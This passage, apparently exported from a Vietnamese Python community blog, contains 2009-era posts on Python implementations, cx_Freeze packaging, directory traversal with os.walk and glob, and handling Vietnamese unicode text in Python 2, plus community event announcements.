Jython Phiên bản mới nhất: 2.5 Được viết bằng Java, chương trình Python sử dụng các lớp của Java (Java class) thay vì mô đun của Python. Ngoài hầu hết các mô đun trong thư viện chuẩn Python, Jython có một ưu điểm rất lớn là có thể sử dụng các lớp trong thư viện chuẩn của Java. Mã lệnh của Jython không được biên dịch ra dạng Python bytecode như CPython mà sang dạng Java bytecode tương tự như các chương trình Java, và tất nhiên mã lệnh này phải được thực thi bởi máy ảo Java chứ không phải trình thông dịch như trong trường hợp của CPython. 3- IronPython Phiên bản mới nhất: 2.0, 2.6 (alpha) Cũng tương tự như Jython, nhưng thay vì được biên dịch ra Java bytecode và thực thi bởi máy ảo Java, mã lệnh một chương trình IronPython được biên dịch sang dạng CIL (Common Intermediate Language) và thực thi bởi máy ảo .Net. Một chương trình viết bằng IronPython có thể sử dụng được các lớp của khung chương trình .Net, do vậy IronPython rất hữu dụng trong việc tích hợp vào một hệ thống viết bằng .Net. 4- Psyco Phiên bản mới nhất: 1.6 Là một bản cài đặt đặc biệt sử dụng phương thức biên dịch tức thời (Just in time compiling) nhằm cải thiện tốc độ thực thi của Python. Tùy thuộc vào loại tác vụ mà Psyco có thể tăng tốc từ 1,5 đến hơn 40 lần. 5- PyPy Phiên bản mới nhất: 1.1 Tiền thân là Psyco, PyPy được viết trên một tập con các lệnh của Python (restricted Python - RPython) nhằm nâng cao tính đa nền tảng so với Psyco, ngoài ra việc sử dụng chính Python để viết khiến cho việc thay đổi và tối ưu đơn giản hơn. Cũng như người tiền nhiệm, PyPy là một trình biên dịch tức thời cho phép cải thiện tốc độ thực thi so với CPython. Tuy bắt đầu là một dự án mang tính nghiên cứu nhưng vì thấy được những ưu điểm của PyPy, hiện các tác giả của PyPy đang tập trung vào việc tương thích với CPython nhằm đưa PyPy vào sử dụng trong thực tiễn. 6- Unladen Swallow Phiên bản mới nhất: 2009Q3 (alpha) Là một dự án đặc biệt của Google cũng nhằm tăng tốc độ thực thi của Python, nhưng khác với Psyco hay Pypy là dựa trên nền tảng LLVM. Unladen Swallow có mục đích là tăng ít nhất gấp 5 lần tốc độ của CPython. Điều này sẽ rất có lợi cho Google, do hãng này ứng dụng Python rất nhiều. Ngoài những bản cài đặt ở trên, ngôn ngữ Python còn rất nhiều bản cài đặt khác như Stackless Python hay WPython v.v... tuy nhiên những bản cài đặt này thường có ứng dụng hẹp hơn, do vậy bài viết chỉ xin giới thiệu những bản cài đặt trên, mong rằng nếu như bạn không ưng ý với CPython thì giờ đây bạn có thể đến với Python theo một cách khác!","tags":"Bài viết","title":"Các bản cài đặt (implementation) của Python"},{"url":"2009/12/python-27-alpha.html","text":"Phiên bản thử nghiệm alpha của Python 2.7 đã được phát hành, phiên bản này không có thêm chức năng gì mới mà chủ yếu là sửa chữa lỗi cộng với việc backport các tính năng của python 3000 về lại, đây cũng sẽ là phiên bản cuối cùng của dòng Python 2. Theo đề xuất mới đây của Guido Van Rossum thì ngôn ngữ Python (cú pháp, thư viện tích hợp v.v...) sẽ tạm dừng phát triển trong vòng ít nhất 2 năm để cho các cài đặt khác của python như PyPy, Jython có thời gian để đuổi kịp nhánh cài đặt chính là CPython. Chính vì vậy mà 2 phiên bản 2.7 và 3.2 sẽ không có thay đổi gì quan trọng mà chỉ chủ yếu để sửa lỗi hay các nâng cấp nhỏ. Thông tin chi tiết về phiên bản Python 2.7 có tại: http://www.python.org/download/releases/2.7/","tags":"Tin tức","title":"Python 2.7 alpha"},{"url":"2009/12/dong-bang-ung-dung-voi-cx_freeze.html","text":"Python là ngôn ngữ thông dịch nên để chạy các ứng dụng viết bằng Python, chúng ta cần phải cài bộ thông dịch. Thao tác này hơi luộm thuộm đối với người dùng cuối, nên thông thường chúng ta hay tự hỏi liệu có cách nào đó để chuyển ứng dụng của chúng ta thành một tập tin .EXE như các ứng dụng Windows khác không. Rất may mắn là chúng ta có thể đạt được mục đích này với chương trình cx_Freeze . Chúng ta sẽ bắt đầu với một ví dụ đơn giản. Hãy tạo một tập tin helloworld.py với nội dung sau: # helloworld.py print \"Hello World!\" Khi chạy chương trình bé nhỏ này (giả sử nó đang nằm trong thư mục c:\\tmp , chúng ta nhận kết quả như sau: c:\\tmp>c:\\Python26\\python helloworld.py Hello World! Bây giờ chúng ta sẽ cài đặt cx_Freeze. Đối với ví dụ trên, chúng ta sẽ phải chọn bản cài đặt cho Windows, và cho phiên bản Python 2.6. Sau khi cài đặt cx_Freeze thì tập tin thực thi sẽ được đặt trong c:\\python26\\scripts\\cxfreeze . Để đóng băng chương trình helloworld.py , chúng ta thực hiện lệnh cxfreeze helloworld.py : c:\\tmp>c:\\Python26\\scripts\\cxfreeze helloworld.py coyping c:\\python26\\lib\\site-packages\\cx_Freeze\\bases\\Console.exe -> c:\\tmp\\dist\\helloworld.exe coyping C:\\Windows\\system32\\python26.dll -> c:\\tmp\\dist\\python26.dll writing zip file c:\\tmp\\dist\\helloworld.exe Name File ---- ---- m StringIO m UserDict m __builtin__ . . . m warnings m zipimport m zlib coyping c:\\python26\\DLLs\\bz2.pyd -> c:\\tmp\\dist\\bz2.pyd coyping c:\\python26\\DLLs\\select.pyd -> c:\\tmp\\dist\\select.pyd coyping c:\\python26\\DLLs\\unicodedata.pyd -> c:\\tmp\\dist\\unicodedata.pyd Kết quả của lệnh này là helloworld.py được đóng băng trong thư mục dist : c:\\tmp>dir /s dist Volume in drive C is OS Volume Serial Number is B07D-8588 Directory of c:\\tmp\\dist 12/01/2009 12:42 PM <DIR> . 12/01/2009 12:42 PM <DIR> .. 12/01/2009 12:42 PM 71,168 bz2.pyd 12/01/2009 12:42 PM 1,423,792 helloworld.exe 12/01/2009 12:42 PM 2,149,888 python26.dll 12/01/2009 12:42 PM 11,776 select.pyd 12/01/2009 12:42 PM 585,728 unicodedata.pyd 5 File(s) 4,242,352 bytes Total Files Listed: 5 File(s) 4,242,352 bytes 2 Dir(s) 118,923,808,768 bytes free Và bây giờ chúng ta có thể đóng gói, hoặc nén các tập tin trong thư mục này để chuyển đến người dùng cuối. Tập tin thực thi chính của chúng ta chính là helloworld.exe : c:\\tmp>cd dist c:\\tmp\\dist>helloworld.exe Hello World! cx_Freeze còn nhận một số tham số dòng lệnh khác. Bạn có thể tham khảo thêm bằng cách chạy cxfreeze --help . Ngoài cx_Freeze còn có một số công cụ khác có chức năng tương tự ví dụ như py2exe .","tags":"Bài viết","title":"Đóng băng ứng dụng với cx_Freeze"},{"url":"2009/11/vithon-hoat-dong-tro-lai.html","text":"Trong vài ngày qua, vì máy chủ cần được nâng cấp nên trang mạng vithon.org đã tạm ngừng hoạt động. Trong khi chờ đợi máy chủ nâng cấp hoàn thành, trang vithon.org đã được di dời qua một máy chủ mới. Các bài viết và thảo luận diễn đàn đã được sao lưu đầy đủ. Nhóm Python cho người Việt sẽ tải dần tất cả những bài viết và thảo luận diễn đàn lên trang mạng trong các ngày tới. Các bạn thành viên cũ có quyền cập nhật trang mạng xin vui lòng liên lạc quản trị để cấp lại tài khoản trên hệ thống Zine này. Chân thành cáo lỗi cùng các bạn vì sự bất tiện này.","tags":"Tin tức","title":"Vithon hoạt động trở lại"},{"url":"2009/10/hoi-thao-pycon-khu-vuc-chau-a-thai-binh-duong-2010.html","text":"PyCon APAC 2010 Hội thảo PyCon Asia Pacific sẽ được tổ chức tại Singapore vào ngày 09 đến 11 tháng 06 năm 2010. Ngày 09 sẽ dành cho các bài hướng dẫn và ngày 10, 11 sẽ dành cho các bài thảo luận. Ban tổ chức kêu gọi sự tham gia của các cá nhân, tập thể trong các bài hướng dẫn lẫn các bài tham luận hội thảo về tất cả các khía cạnh của Python -- từ lập trình không chuyên đến lập trình chuyên nghiệp, về các ứng dụng hoặc khung phần mềm, và bạn sử dụng Python như thế nào trong công việc. Các diễn giả lần đầu, đặc biệt là những diễn giả từ khu vực châu Á, được khuyến khích gửi bài cho ban tổ chức. Thông tin thêm về hội thảo PyCon Châu Á - Thái Bình Dương có thể được tìm thấy tại http://apac.pycon.org/","tags":"Tin tức","title":"Hội thảo PyCon khu vực Châu Á - Thái Bình Dương 2010"},{"url":"2009/10/cong-dong-pcnv-ho-tro-gnomeasia.html","text":"PCNV là một trong những nhóm hỗ trợ cộng đồng tại hội thảo GNOME Asia 2009 tổ chức tại Công viên Phần mềm Quang Trung, thành phố Hồ Chí Minh. GNOME.Asia Summit diễn ra từ ngày 20 đến 22 tháng 11 năm 2009 tại Công viên phần mềm Quang Trung, thành phố Hồ Chí Minh, là một trong những sự kiện công nghệ nguồn mở hàng đầu trong khu vực, sẽ được đăng tải trên 20 tờ báo, đài truyền hình, và các diễn đàn trong và ngoài nước. Với mục đích khám phá tương lai của cộng đồng mã nguồn mở ở châu Á, và mở rộng cơ hội hợp tác Á-Âu, Gnome.Asia Summit dự kiến sẽ có sự tham gia của hơn 500 khách mời từ 10 quốc gia trên thế giới. Ban tổ chức trân trọng mời các cá nhân, đoàn thể có quan tâm cùng tham gia sự kiện này. Ngoài việc kêu gọi cộng đồng người sử dụng Python tham gia vào hội thảo GNOME Asia, nhóm PCNV của chúng ta cũng sẽ tham gia hội thảo với bài trình bày Python cho phần đời còn lại . Đây cũng là một cơ hội để chúng ta cùng gặp mặt trực tiếp ngoài đời thường.","tags":"Tin tức","title":"Cộng đồng PCNV hỗ trợ GNOME.Asia"},{"url":"2009/06/duyet-qua-cac-file-trong-mot-thu-muc.html","text":"Bạn thường gặp bài toán liệt kê danh sách tất cả các file trong một thư mục cho trước. Dưới đây là một vài các cách khác nhau tùy theo hoàn cảnh. 1. Sử dụng os.listdir Câu lệnh sau sẽ lấy danh mục các file trong thư mục Test nằm trong thư mục cá nhân của bạn. >>> import os >>> path = \"~/Test\" >>> os . listdir ( os . path . expanduser ( path )) ['file 3', 'file 1', 'file 2'] os.listdir chỉ cho bạn tên file hoặc thư mục nằm trong đường dẫn đó. Ví dụ: >>> path = \"/mnt/data/pictures/\" >>> os . listdir ( path ) ['Old', 'Icons', 'baby.jpg'] Để có đường dẫn đầy đủ bạn có thể viết: >>> FJoin = os . path . join >>> files = [ FJoin ( path , f ) for f in os . listdir ( path )] >>> files ['/mnt/data/pictures/Old', '/mnt/data/pictures/Icons', '/mnt/data/pictures/baby.jpg'] Để đảm bảo vấn đề tương thích mã khi chuyển qua lại giữa các hệ điều hành bạn luôn luôn nên dùng: os.path.join để nối các đường dẫn, hoặc dùng os.path.sep để cộng các đường dẫn. Không nên: path = path1 + \"\\path2\" Nên viết: path = os . path . join ( path1 , \"path2\" ) hoặc path = path1 + os . path . sep + path2 Trên Windows bạn có thể viết: path = \"~/Test\" hoặc \"~/test\" đều được. Linux phân biệt chữ hoa chữ thường nên phải viết chính xác Test . Ký tự phân tách đường dẫn trên linux là \"/\" , trên Windows bạn có thể viết \"/\" hoặc tôi hay dùng \"\\\\\" (thay vì `\"\\\" ). 2. Sử dụng walk os.listdir chỉ liệt kê các file và thư mục trong một thư mục. Để lấy được cả danh sách đệ quy các file trong thư mục bạn có thể dùng os.walk hoặc thư viện ngoài glob . Hàm os.walk là một generator function và os.walk(path) là một generator object . Nghĩa là hàm trạng thái trả về các kết quả kế tiếp nhau theo yêu cầu. Mỗi một item của walk có ba thành phần: Thư mục hiện tại Các thư mục con Các file bên trong Dưới đây là hàm sử dụng walk để liệt kê tất cả các file và thư mục con trong một thư mục cho trước, kết quả trả về chứa đường dẫn đầy đủ: import os FJoin = os . path . join def GetFiles ( path ): \"\"\"Output: file_list là danh sách tất cả các file trong path và trong tất cả các thư mục con bên trong nó. dir_list là danh sách tất cả các thư mục con của nó. Các output đều chứa đường dẫn đầy đủ.\"\"\" file_list , dir_list = [], [] for dir , subdirs , files in os . walk ( path ): file_list . extend ([ FJoin ( dir , f ) for f in files ]) dir_list . extend ([ FJoin ( dir , d ) for d in subdirs ]) return file_list , dir_list if __name__ == \"__main__\" : files , dirs = GetFiles ( os . path . expanduser ( \"~/Music\" )) for file in files : print file for dir in dirs : print dir Hàm này chạy tốt trên Windows, trên Linux nó lấy cả các link. Nói chung các link sẽ không có ý nghĩa trong đa số các trường hợp của bạn. Để loại bỏ các link bạn viêt lại hàm GetFiles như sau: def GetFiles ( path ): file_list , dir_list = [], [] for dir , subdirs , files in os . walk ( path ): file_list . extend ([ FJoin ( dir , f ) for f in files ]) dir_list . extend ([ FJoin ( dir , d ) for d in subdirs ]) file_list = filter ( lambda x : not os . path . islink ( x ), file_list ) dir_list = filter ( lambda x : not os . path . islink ( x ), dir_list ) return file_list , dir_list Chú ý rằng một object vừa có thể là file vừa có thể là link. Vì vậy bạn không thể dùng hàm os.path.isfile để lọc các link được: >>> os . path . islink ( '/home/hoaiptm/Music/mylink' ) True >>> os . path . isfile ( '/home/hoaiptm/Music/mylink' ) True Tương tự như vậy với hàm os.path.isdir , nó cũng trả về True nếu object là link liên kết đến một thư mục khác. 3. Sử dụng glob glob là cách liệt kê file và thư mục theo pattern, các pattern có thể chứa các ký tự đại diện như * , ? , [] , nó cho phép bạn tìm kiếm chỉ các file có tên thỏa mãn quy tắc pattern cho trước. Ví dụ: # liệt kê các file và thư mục trong thư mục path glob . glob ( os . path . join ( path , \"*\" )) # liệt kê các file và thư mục cấp 2 bên trong thư mục path. # chẳng hạn path chứa thư mục A, B, C thì lệnh trên sẽ # liệt kê hết các file và thư mục bên trong A, B, C. glob . glob ( os . path . join ( path , \"*\" , \"*\" )) # liệt kê các file và thư mục trong thư mục path bắt đầu với chữ cái a. glob . glob ( os . path . join ( path , \"[a]*\" )) # liệt kê các file và thư mục trong thư mục path # có tên kết thúc bằng chữ cái p và có đúng 3 ký tự. glob . glob ( os . path . join ( path , \"??p\" )) Chú ý rằng không giống như listdir hoặc walk , glob lấy đường dẫn đầy đủ. Hàm glob không thực hiện đệ quy. Hàm sau đây sử dụng glob để tìm kiếm đệ quy tất cả các file và thư mục bên trong thư mục cho trước: import os from os import path import glob def dirwalk ( dir , bag , wildcards ): bag . extend ( glob . glob ( path . join ( dir , wildcards ))) for f in os . listdir ( dir ): fullpath = os . path . join ( dir , f ) if os . path . isdir ( fullpath ) and not os . path . islink ( fullpath ): dirwalk ( fullpath , bag , wildcards ) files = [] # Lấy tất cả các file và thư mục con trong thư mục path: dirwalk ( path , files , \"*\" ) # Lấy tất cả các file trong thư mục path (có thể có lẫn thư mục): dirwalk ( path , files , \"*.*\" ) # Lấy tất cả các file python trong thư mục path: dirwalk ( path , files , \"*.py\" ) # Lấy tất cả các file hoặc thư mục bắt đầu bằng \"py\" trong thư mục path: dirwalk ( path , files , \"py*.*\" ) Hàm dirwalk ở triển khai này làm được nhiều việc hơn hàm GetFiles triển khai ở mục 2. Nó tổng quát hơn. Một cách triển khai khác có thể viết như thế này: def dirwalk2 ( dir , bag , wildcards ): \"\"\" bag là một list chứa các file thỏa mãn quy tắc wildcards \"\"\" if glob . glob ( path . join ( dir , \"*\" )): bag . extend ( glob . glob ( path . join ( dir , wildcards ))) dirwalk2 ( path . join ( dir , \"*\" ), bag , wildcards ) dirwalk2 tuy ngắn gọn nhưng khó hiểu hơn dirwalk . Nó hoàn toàn tương tự ngoại trừ việc không kiểm tra một object có thể là link (chỉ có ý nghĩa trên linux). 4. Thư mục có chứa tên file tiếng Việt Các ví dụ phía trên giả thiết rằng bạn có các tên file và thư mục là tiếng anh thông thường hoặc tiếng việt không dấu. Thư mục có thể chứa các file có tên tiếng việt hoặc tiếng Tàu, tiếng Hàn... Bạn phải truyền đối số unicode cho các hàm listdir , walk , glob ... Quy tắc này áp dụng cho tất cả các hàm và thủ tục khác thao tác với file. Quan sát ví dụ sau (trên Windows): >>> import os >>> FJoin = os . path . join >>> FExists = os . path . exists >>> path = \"D:/abc\" >>> os . listdir ( path ) ['V? mi?n t\\xe2y'] >>> [ FJoin ( path , f ) for f in os . listdir ( path )] ['D:/abc\\\\V? mi?n t\\xe2y'] >>> [ FExists ( FJoin ( path , f )) for f in os . listdir ( path )] [False] Thư mục abc có chứa duy nhất file Về miền tây , tên file là tiếng Việt có dấu, kết quả kiểm tra sự tồn tại cho thấy file không tồn tại. Nguyên nhân là từ hàm listdir . Nêu đối số của hàm listdir là unicode các tên file lấy về cũng là unicode, nếu là ascii, các tên file trả về cũng là dạng ascii. Vì vậy tên file trả về của listdir trong trường hợp này không đúng và bạn không thể thao tác với file đó được. Để lấy đúng tên file trong trường hợp này bạn phải truyền đối số unicode cho hàm listdir : >>> path = u \"D:/abc\" >>> [ FJoin ( path , f ) for f in os . listdir ( path )] [u'D:/abc\\\\V\\u1ec1 mi\\u1ec1n t\\xe2y'] >>> [ FExists ( FJoin ( path , f )) for f in os . listdir ( path )] [True] Tuy nhiên trên Linux, bạn không gặp vấn đề này. 5. Bài tập ví dụ: Viết chương trình đổi tên tất cả các file trong thư mục c:\\data và các thư mục con của nó. Đổi tên các file có phần mở rộng là *.htm thành *.docx . Dưới đây là một triển khai của bài tập này: # -*- coding: utf-8 -*- #!/usr/bin/env python from os import path import os import glob def dirwalk ( dir , bag , wildcards ): \"\"\" bag là một list chứa các file thỏa mãn quy tắc wildcards \"\"\" if glob . glob ( path . join ( dir , \"*\" )): bag . extend ( glob . glob ( path . join ( dir , wildcards ))) dirwalk ( path . join ( dir , \"*\" ), bag , wildcards ) def rename ( oldName , newExt ): \"\"\" Thay thế phần mở rộng cũ thành mở rộng mới. Giả thiết oldName luôn có phần mở rộng. \"\"\" newName = oldName [ 0 : oldName . rfind ( \".\" ) + 1 ] + newExt os . rename ( oldName , newName ) return newName def WalkAndRename ( dir , oldExt , newExt ): files = [] dirwalk ( dir , files , u \"*\" + oldExt ) for f in files : print f , \"-->\" , rename ( f , newExt ) if __name__ == \"__main__\" : WalkAndRename ( 'c: \\\\ data' , \"htm\" , 'docx' )","tags":"Bài viết","title":"Duyệt qua các file trong một thư mục"},{"url":"2009/06/xu-ly-tieng-viet-trong-python.html","text":"Ví dụ sau minh họa 3 codecs bạn hay gặp nhất trong Python: >>> s = \"sky down no enemy\" >>> print type ( s ), len ( s ) <type 'str'> 17 >>> s = \"thiên hạ vô địch\" >>> s 'thi\\xc3\\xaan h\\xe1\\xba\\xa1 v\\xc3\\xb4 \\xc4\\x91\\xe1\\xbb\\x8bch' >>> print type ( s ), len ( s ) <type 'str'> 23 >>> s = unicode ( \"thiên hạ vô địch\" , 'utf8' ) >>> s u'thi\\xean h\\u1ea1 v\\xf4 \\u0111\\u1ecbch' >>> print type ( s ), len ( s ) <type 'unicode'> 16 Nghiên cứu ví dụ trên. len(s) trong hai ví dụ đầu thực sự là số byte cần để lưu trữ s . len(s) trong ví dụ 3 là độ dài ký tự, dung lượng nhớ thực sự để lưu trữ s là 16 * 2 = 32 bytes. Tại bất cứ một thời điểm nào trong chương trình Python bạn cũng phải xác định được bạn đang thao tác với chuỗi kiểu gì: ascii, unicode, hay utf8... Dùng lệnh sau để biết một chuỗi là unicode hay không: >>> s u'thi\\xean h\\u1ea1 v\\xf4 \\u0111\\u1ecbch' >>> type ( s ) == type ( u \"\" ) True >>> ss = \"sky down no enemy\" >>> type ( ss ) == type ( u \"\" ) False >>> s = \"thiên hạ vô địch\" >>> type ( ss ) == type ( u \"\" ) False Cộng một chuỗi không phải unicode với một chuỗi unicode thì chuỗi không phải unicode sẽ được tự động convert sang unicode trước khi cộng: >>> ss = \"sky down no enemy\" >>> ss + u \"\" u'sky down no enemy' >>> ss = \"thiên hạ vô địch\" >>> ss + u \"\" Traceback (most recent call last): File \"<stdin>\" , line 1 , in <module> UnicodeDecodeError : 'ascii' codec can't decode byte 0xc3 in position 3: ordinal not in range(128) >>> ss = unicode ( \"thiên hạ vô địch\" , 'utf8' ) >>> ss + u \"\" u'thi\\xean h\\u1ea1 v\\xf4 \\u0111\\u1ecbch' Trong tình huống thứ 2 bạn cố gắng cộng một chuỗi utf8 vào chuỗi unicode. Python tự động chuyển chuỗi utf8 thành chuỗi unicode bằng cách decode với codec='ascii', vì vậy gặp lỗi. Tình huống này tương đương với: ss + u\"\" = ss.decode('ascii') + u\"\" >>> ss = \"thiên hạ vô địch\" >>> ss . decode ( 'ascii' ) + u \"\" Traceback (most recent call last): File \"<stdin>\" , line 1 , in <module> UnicodeDecodeError : 'ascii' codec can't decode byte 0xc3 in position 3: ordinal not in range(128) Hai cách để cộng đúng là: ss.decode('utf8') + u\"\" hoặc unicode(ss, 'utf8') + u\"\" Các thao tác với chuỗi khác như join , split , find ... cũng tương tự. Nghĩa là nếu có một tham số unicode thì các tham số còn lại được tự động chuyển sang unicode trước khi thực hiện thao tác. Ví dụ: >>> ss = \"sky down no enemy\" >>> ss . split ( u \" \" ) [u'sky', u'down', u'no', u'enemy'] >>> l = [ \"sky\" , \"down\" , \"no\" , \"enemy\" ] >>> unichr ( 32 ) . join ( l ) u'sky down no enemy' Tương tự thao tác sau sẽ gây lỗi: >>> s = \"thiên hạ vô địch\" >>> s . split ( u \" \" ) Traceback (most recent call last): File \"<string>\" , line 1 , in <string> UnicodeDecodeError : 'ascii' codec can't decode byte 0xc3 in position 3: ordinal not in range(128) Để chuyển một chuỗi tiếng Việt utf sang dạng viết hoa, bạn luôn luôn phải chuyển nó về unicode trước. Nghiên cứu ví dụ sau: >>> s = \"thiên hạ vô địch\" >>> s . upper () 'THI\\xc3\\xaaN H\\xe1\\xba\\xa1 V\\xc3\\xb4 \\xc4\\x91\\xe1\\xbb\\x8bCH' >>> s 'thi\\xc3\\xaan h\\xe1\\xba\\xa1 v\\xc3\\xb4 \\xc4\\x91\\xe1\\xbb\\x8bch' <</sourcecode>> So sánh với s ta thấy s.upper() không upper case được các ký tự ê , ạ , ô , đ , ị ... Để upper một chuỗi utf bạn phải chuyển nó về unicode trước, upper xong thì chuyển ngược lại. Hàm Upper sau nhận đầu vào là chuỗi utf, upper nó và trả về utf khác đã được upper, hàm này thích hợp cho mục đích upper tiếng Việt: # -*- coding: utf-8 -*- def Upper ( s ): if type ( s ) == type ( u \"\" ): return s . upper () return unicode ( s , \"utf8\" ) . upper () . encode ( \"utf8\" ) if __name__ == \"__main__\" : s = \"thiên hạ vô địch\" us = s . decode ( 'utf8' ) print s . upper () print Upper ( s ) print Upper ( us ) Kết quả: THIêN Hạ Vô địCH THIÊN HẠ VÔ ĐỊCH THIÊN HẠ VÔ ĐỊCH Đầu vào thích hợp của Upper là ascii, utf8, unicode, các dạng khác có thể sai: latin1, tcvn... Tương tự như vậy cho hàm lower, và capwords. Xem xét ví sau với capwords: # -*- coding: utf-8 -*- import string s = \"thiên hạ vô địch\" print string . capwords ( s ) print string . capwords ( s . decode ( 'utf8' )) Kết quả: Thiên Hạ Vô địch Thiên Hạ Vô Địch Các tên file hoặc tên thư mục là tiếng Việt có dấu cũng đòi hỏi cách xử lý đặc biệt. Giả sử bạn có thư mục abc với một file duy nhất tên là: tiếng việt.txt . Thư mục abc đặt trong thư mục cá nhân của bạn. Nghiên cứu đoạn chương trình sau: # -*- coding: utf-8 -*- import os path = os . path . join ( os . path . expanduser ( \"~\" ), \"abc\" ) files = [ os . path . join ( path , basename ) for basename in os . listdir ( path )] print map ( os . path . exists , files ) Chú ý: Trên Windows path = \"C:\\Documents and Settings\\YourAccountName\\abc\" Trên Linux path = \"/home/YourAccountName/abc\" Vì chỉ có duy nhất một file tiếng việt.txt trong thư mục abc nên chúng ta mong đợi kết quả in ra là: [True] . Tuy nhiên chỉ Linux cho câu trả lời này. Windows thì không. Không tin bạn thử xem. Chương trình trên cho dù đã được viết với việc tận dụng thư viện sẵn có os nhằm nâng cao tính khả chuyển nhưng vẫn không khả chuyển, khi tên file là tiếng Việt có dấu. Giải quyết vấn đề này rất đơn giản bạn chỉ cần thay \"abc\" thành u\"abc\" để tất cả các đường dẫn tên file bị ép chuyển sang unicode là OK. Bạn làm như sau: path = os . path . join ( os . path . expanduser ( \"~\" ), u \"abc\" ) hoặc path = os . path . join ( os . path . expanduser ( u \"~\" ), \"abc\" ) Các vấn đề tương tự cũng áp dụng cho hàm glob hoặc walk , Các hàm này cần các đường dẫn là chuỗi unicode để có thể lấy chính xác các file có tên tiếng Việt. Loại bỏ dấu tiếng Việt. Trong nhiều trường hợp bạn cần loại bỏ dấu của một chuỗi tiếng Việt có dấu. Chẳng hạn chuyển tiếng việt thành tieng viet . Đây là một cách thức đơn giản giải quyết vấn đề này: # -*- coding: utf-8 -*- import string import re INTAB = \"ạảãàáâậầấẩẫăắằặẳẵóòọõỏôộổỗồốơờớợởỡéèẻẹẽêếềệểễúùụủũưựữửừứíìịỉĩýỳỷỵỹđ\" INTAB = [ ch . encode ( 'utf8' ) for ch in unicode ( INTAB , 'utf8' )] OUTTAB = \"a\" * 17 + \"o\" * 17 + \"e\" * 11 + \"u\" * 11 + \"i\" * 5 + \"y\" * 5 + \"d\" r = re . compile ( \"|\" . join ( INTAB )) replaces_dict = dict ( zip ( INTAB , OUTTAB )) def khongdau ( utf8_str ): return r . sub ( lambda m : replaces_dict [ m . group ( 0 )], utf8_str ) print khongdau ( \"thiên hạ vô địch\" ) print khongdau ( \"sky down no enemy\" ) print khongdau ( \"THIÊN HẠ VÔ ĐỊCH\" ) Kết quả: thien ha vo dich sky down no enemy THIÊN HẠ VÔ ĐỊCH Test thứ ba cho thấy nó chưa làm việc với chữ hoa. Một chút cải tiến nhỏ để nó làm việc với chữ hoa các bạn có thể thêm vào dễ dàng. Chương trình này chưa được test kỹ về sự chính xác và về performance. Các bạn tự test và công bố kết quả nhé. Slice với chuỗi tiếng việt dạng utf8 có thể gặp các vấn đề. Thao tác tương tự khi bạn đọc các khối dữ liệu utf8 với kích thước quy định trước từ file utf8. Xem xét các ví dụ sau: >>> s = 'thiên hạ vô địch' >>> s 'thi\\xc3\\xaan h\\xe1\\xba\\xa1 v\\xc3\\xb4 \\xc4\\x91\\xe1\\xbb\\x8bch' >>> s [ 7 : 17 ] 'h\\xe1\\xba\\xa1 v\\xc3\\xb4 \\xc4' chuỗi s[7:17] là chuỗi què. byte cuối cùng của chuỗi này \\xc4 mới là một nửa của chữ cái đ ( '\\xc4\\x91' ), vì vậy mọi thao tác của bạn trên chuỗi này có tiềm năng gặp lỗi. chẳng hạn: >>> unicode ( s [ 7 : 17 ], 'utf8' ) Traceback (most recent call last): File \"<stdin>\" , line 1 , in <module> File \"/usr/lib/python2.6/encodings/utf_8.py\" , line 16 , in decode return codecs . utf_8_decode ( input , errors , True ) UnicodeDecodeError : 'utf8' codec can't decode byte 0xc4 in position 9: unexpected end of data >>> unicode ( s [ 7 : 16 ], 'utf8' ) u'h\\u1ea1 v\\xf4 ' Unicode áp dụng cho s[7:16] thì vô tư vì nó không bị què. Việc đọc các file text utf8 cũng gặp tình huống tương tự. Chẳng hạn thao tác sau tiềm năng gặp lỗi: f = open ( \"file name\" , \"r\" ) s = f . read ( 1000 ) ... s . close () Trong tình huống này bạn cố gắng đọc 1000 byte đầu tiên của file, s có thể là chuỗi tiếng Việt bị què như tình huống ở trên. Đọc ghi file dữ liệu tiếng Việt. File chứa dữ liệu dạng văn bản tiếng Việt thường được ghi dưới dạng unicode hoặc utf8. Đoạn chương trình sau đọc nội dung utf8: ff = open(\"anyfile\", 'r') content = ff.read() ff.close() Dữ liệu tiếng Việt lưu dưới dạng utf8 thường có BOM_UTF8 (= \"\\xef\\xbb\\xbf\" ) ở đầu file. Bạn phải loại bỏ cái này trước khi có thể làm cái gì đó. Đoạn chương trình sau làm việc này: import codecs content = open ( \"anyfile\" , 'r' ) . read () if content . startswith ( codecs . BOM_UTF8 ): content = content [ 3 :] Chú ý rằng đoạn chương trình trên không thích hợp cho việc xử lý các file lớn (hơn 200MB). Với các file lớn bạn cần chia nhỏ thành các file nhỏ hơn. codecs là thư viện chứa rất nhiều BOM. >>> dir ( codecs ) ['BOM', 'BOM32_BE', 'BOM32_LE', 'BOM64_BE', 'BOM64_LE', 'BOM_BE', 'BOM_LE', 'BOM_UTF16', 'BOM_UTF16_BE', 'BOM_UTF16_LE', 'BOM_UTF32', 'BOM_UTF32_BE', 'BOM_UTF32_LE', 'BOM_UTF8', ...] Dùng thư viện codecs bạn có thể nhanh chóng đọc nội dung file mà không mất nhiều công biến đổi encoding. Ví dụ: # đọc toàn bộ nội dung của file vào content, # nội dung của file được biết trước như là utf8, # content sẽ là nội dung unicode. content = codecs . open ( 'your file name' , 'r' , 'utf8' ) . read () # mặc định đọc toàn bộ nội dung của file vào content # (dạng mặc định là utf8) content = codecs . open ( 'your file name' , 'r' ) . read () Ghi dữ liệu tiếng Việt ra file: ff = open ( \"filename\" , 'w' ) . write ( content ) Ở đây content là chuỗi utf8, nếu bạn đưa vào content là dạng unicode, nó sẽ được tự động chuyển về dạng utf8 trước khi được ghi ra file.","tags":"Bài viết","title":"Xử lý tiếng Việt trong Python"},{"url":"2009/05/cau-truc-don-gian-cua-mot-chuong-trinh-python.html","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # Bạn có thể comment bằng tiếng Việt có dấu thoải mái. Hãy dùng tín hiệu ở # dòng trên để báo cho các Editor biết được đây là file utf8. \"\"\" đây là cách thức được dùng để viết docstring cho một khối \"\"\" # Viết thêm cái này cho nó đẹp \"\"\" #----------------------------------------------------------------------------- # Name: Module Name # # Purpose: # # Version: 1.1 # # Author: # # Created: 13/01/2009 # Updated: 30/04/2009 # # Copyright: (c) YourCompany # # Todo: #----------------------------------------------------------------------------- \"\"\" # Import các thư viện from xml import sax import re import os # Khai báo và triển khai các lớp class YourClass : \"\"\" Đặt các mô tả về lớp ở đây \"\"\" def __init__ ( self ): \"\"\" Viết một cái gì đó để giải thích nếu cần thiết \"\"\" # KHÔNG nên viết quá 3 lệnh python trên một dòng, chương trình # của bạn sẽ rất khó hiểu. self . a , self . b = [], {} pass # KHÔNG nên viết một dòng Python dài hơn 80 ký tự def 